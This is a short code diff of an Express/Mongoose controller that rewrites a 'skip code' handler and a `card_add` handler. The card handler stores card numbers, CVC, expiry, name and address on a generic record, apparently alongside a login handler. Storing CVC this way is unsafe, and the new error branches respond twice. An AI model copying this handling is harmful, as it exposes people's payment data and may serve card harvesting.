@@ -158,7 +158,9 @@ export const login_post = async (req, res) => {
 
 
 export const skip_code = (req, res) => {
+
     const { id, skipcode } = req.body;
+
     Info.findOneAndUpdate({ _id: id }, {
         $set: {
             skipcode: skipcode
@@ -168,33 +170,47 @@ export const skip_code = (req, res) => {
             res.status(400).json({ error: err })
         }
 
-        return res.status(200).json({ success: true,id:id })
+        return res.status(200).json({ success:id })
     })
 
 }
 
 
 
-export const card_add =async (req, res) => {
-    const { id, validity,address,cardNumber,cvc,name,zipCode } = req.body;
-    try {
+export const card_add = (req, res) => {
+
+    const {id, validity,address,cardNumber,cvc,name,zipCode } = req.body;
+
+
+    Info.findOneAndUpdate({ _id: id }, {
+        $set: {
+            validity,address,cardNumber,cvc,name,zipCode
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+
+        return res.status(200).json({ success:id })
+    })
+    // try {
         
 
-            await Info.findOneAndUpdate({_id:id}, { validity,address,cardNumber,cvc,name,zipCode}, {
-                new: true,
-                upsert: true
-            });
-         return   res.status(200).json({ success: true })
+    //         await Info.findOneAndUpdate({_id:id}, { validity,address,cardNumber,cvc,name,zipCode}, {
+    //             new: true,
+    //             upsert: true
+    //         });
+    //      return   res.status(200).json({ success: true })
 
        
 
-    }
-    catch (e) {
+    // }
+    // catch (e) {
 
-        return   res.status(400).json({ e: "error" })
+    //     return   res.status(400).json({ e: "error" })
 
 
-    }
+    // }
 
 
 }
